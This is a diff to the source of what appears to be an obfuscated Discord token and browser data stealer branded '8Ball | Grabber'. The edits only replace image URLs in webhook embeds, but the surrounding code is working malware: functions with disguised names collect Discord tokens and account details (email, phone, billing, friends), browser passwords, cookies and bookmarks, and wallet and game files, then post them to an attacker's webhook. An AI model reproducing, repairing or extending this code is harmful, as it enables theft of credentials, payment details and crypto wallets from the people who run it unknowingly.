@@ -277,10 +277,10 @@ def send_confirmation_embed(title, description):
             "embeds": [{
                 "title": title,
                 "description": description,
-                "footer": {"text": "8Ball", "icon_url": "https://i.ibb.co/fdFfLznd/images.png"}
+                "footer": {"text": "8Ball", "icon_url": "https://media.discordapp.net/attachments/1515919422844440731/1515922353094262876/download_1.jpg?ex=6a3df335&is=6a3ca1b5&hm=14ae87a21ca4b4ece101ab835118a77367fb59b3242371a4ec6ec359a82abfd3&=&format=webp"}
             }],
             "username": "8Ball | Grabber",
-            "avatar_url": "https://i.ibb.co/fdFfLznd/images.png",
+            "avatar_url": "https://media.discordapp.net/attachments/1515919422844440731/1515922353094262876/download_1.jpg?ex=6a3df335&is=6a3ca1b5&hm=14ae87a21ca4b4ece101ab835118a77367fb59b3242371a4ec6ec359a82abfd3&=&format=webp",
             "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
         }
         L04DUr118(h00k, data=dumps(payload).encode(), headers=headers)
@@ -803,7 +803,7 @@ def UP104D70K3N(token, path):
         }
         username, hashtag, email, idd, pfp, flags, nitro, phone = G3770K3N1NF0(token)
 
-        pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}" if pfp != None else "https://i.ibb.co/fdFfLznd/images.png"
+        pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}" if pfp != None else "https://media.discordapp.net/attachments/1515919422844440731/1515922353094262876/download_1.jpg?ex=6a3df335&is=6a3ca1b5&hm=14ae87a21ca4b4ece101ab835118a77367fb59b3242371a4ec6ec359a82abfd3&=&format=webp"
         billing = G3781111N6(token)
         badge = G3784D63(flags)
         friends = Tr1M(G37UHQFr13ND5(token))
@@ -873,7 +873,7 @@ def UP104D70K3N(token, path):
                     },
                 "footer": {
                     "text": f"8Ball",
-                    "icon_url": "https://i.ibb.co/fdFfLznd/images.png"
+                    "icon_url": "https://media.discordapp.net/attachments/1515919422844440731/1515922353094262876/download_1.jpg?ex=6a3df335&is=6a3ca1b5&hm=14ae87a21ca4b4ece101ab835118a77367fb59b3242371a4ec6ec359a82abfd3&=&format=webp"
                     },
                 "thumbnail": {
                     "url": f"{pfp}"
@@ -881,7 +881,7 @@ def UP104D70K3N(token, path):
                 }
             ],
             "username": f"8Ball | Grabber",
-            "avatar_url": "https://i.ibb.co/fdFfLznd/images.png",
+            "avatar_url": "https://media.discordapp.net/attachments/1515919422844440731/1515922353094262876/download_1.jpg?ex=6a3df335&is=6a3ca1b5&hm=14ae87a21ca4b4ece101ab835118a77367fb59b3242371a4ec6ec359a82abfd3&=&format=webp",
             "attachments": [],
             "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
             }
@@ -916,12 +916,12 @@ def UP104D(name, link):
                "title": f"8Ball | Data Extractor","fields": link,
                 "footer": {
                     "text": f"8Ball",
-                    "icon_url": "https://i.ibb.co/fdFfLznd/images.png"
+                    "icon_url": "https://media.discordapp.net/attachments/1515919422844440731/1515922353094262876/download_1.jpg?ex=6a3df335&is=6a3ca1b5&hm=14ae87a21ca4b4ece101ab835118a77367fb59b3242371a4ec6ec359a82abfd3&=&format=webp"
                 },
                 }
             ],
             "username": f"8Ball | Grabber",
-            "avatar_url": "https://i.ibb.co/fdFfLznd/images.png",
+            "avatar_url": "https://media.discordapp.net/attachments/1515919422844440731/1515922353094262876/download_1.jpg?ex=6a3df335&is=6a3ca1b5&hm=14ae87a21ca4b4ece101ab835118a77367fb59b3242371a4ec6ec359a82abfd3&=&format=webp",
             "attachments": [],
             "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
             }
@@ -947,12 +947,12 @@ def UP104D(name, link):
                 "title": f"8Ball | File 8Ball",
                 "footer": {
                     "text": f"8Ball",
-                    "icon_url": "https://i.ibb.co/fdFfLznd/images.png"
+                    "icon_url": "https://media.discordapp.net/attachments/1515919422844440731/1515922353094262876/download_1.jpg?ex=6a3df335&is=6a3ca1b5&hm=14ae87a21ca4b4ece101ab835118a77367fb59b3242371a4ec6ec359a82abfd3&=&format=webp"
                 }
                 }
             ],
             "username": f"8Ball | Grabber",
-            "avatar_url": "https://i.ibb.co/fdFfLznd/images.png",
+            "avatar_url": "https://media.discordapp.net/attachments/1515919422844440731/1515922353094262876/download_1.jpg?ex=6a3df335&is=6a3ca1b5&hm=14ae87a21ca4b4ece101ab835118a77367fb59b3242371a4ec6ec359a82abfd3&=&format=webp",
             "attachments": [],
             "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
             }
@@ -1312,7 +1312,7 @@ def G378r0W53r5(br0W53rP47H5):
                     f"<a:CH_IconArrowRight:715585320178941993> • [8Ball_Passwords.csv]({filess[1]})"
                 ),"footer": {
                     "text": "8Ball",
-                    "icon_url": "https://i.ibb.co/fdFfLznd/images.png"
+                    "icon_url": "https://media.discordapp.net/attachments/1515919422844440731/1515922353094262876/download_1.jpg?ex=6a3df335&is=6a3ca1b5&hm=14ae87a21ca4b4ece101ab835118a77367fb59b3242371a4ec6ec359a82abfd3&=&format=webp"
                 }
             },
             {
@@ -1323,7 +1323,7 @@ def G378r0W53r5(br0W53rP47H5):
                     f"<a:CH_IconArrowRight:715585320178941993> • [8Ball_Cookies.txt]({filess[2]})"
                 ),"footer": {
                     "text": "8Ball",
-                    "icon_url": "https://i.ibb.co/fdFfLznd/images.png"
+                    "icon_url": "https://media.discordapp.net/attachments/1515919422844440731/1515922353094262876/download_1.jpg?ex=6a3df335&is=6a3ca1b5&hm=14ae87a21ca4b4ece101ab835118a77367fb59b3242371a4ec6ec359a82abfd3&=&format=webp"
                 }
             },
             {
@@ -1339,12 +1339,12 @@ def G378r0W53r5(br0W53rP47H5):
                     f"<a:CH_IconArrowRight:715585320178941993> • [8Ball_Bookmarks.txt]({filess[6]})"
                 ),"footer": {
                     "text": "8Ball",
-                    "icon_url": "https://i.ibb.co/fdFfLznd/images.png"
+                    "icon_url": "https://media.discordapp.net/attachments/1515919422844440731/1515922353094262876/download_1.jpg?ex=6a3df335&is=6a3ca1b5&hm=14ae87a21ca4b4ece101ab835118a77367fb59b3242371a4ec6ec359a82abfd3&=&format=webp"
                 }
             }
         ],
         "username": "8Ball | Grabber",
-        "avatar_url": "https://i.ibb.co/fdFfLznd/images.png",
+        "avatar_url": "https://media.discordapp.net/attachments/1515919422844440731/1515922353094262876/download_1.jpg?ex=6a3df335&is=6a3ca1b5&hm=14ae87a21ca4b4ece101ab835118a77367fb59b3242371a4ec6ec359a82abfd3&=&format=webp",
         "attachments": [],
         "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
     }
@@ -1433,12 +1433,12 @@ def G47H3rZ1P5(paths1, paths2, paths3):
             "title": f"8Ball | App 8Ball",
             "description": f"{wal}\n{ga}\n{ot}","footer": {
                 "text": f"8Ball",
-                "icon_url": "https://i.ibb.co/fdFfLznd/images.png"
+                "icon_url": "https://media.discordapp.net/attachments/1515919422844440731/1515922353094262876/download_1.jpg?ex=6a3df335&is=6a3ca1b5&hm=14ae87a21ca4b4ece101ab835118a77367fb59b3242371a4ec6ec359a82abfd3&=&format=webp"
             }
             }
         ],
         "username": f"8Ball | Grabber",
-        "avatar_url": "https://i.ibb.co/fdFfLznd/images.png",
+        "avatar_url": "https://media.discordapp.net/attachments/1515919422844440731/1515922353094262876/download_1.jpg?ex=6a3df335&is=6a3ca1b5&hm=14ae87a21ca4b4ece101ab835118a77367fb59b3242371a4ec6ec359a82abfd3&=&format=webp",
         "attachments": [],
         "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
     }
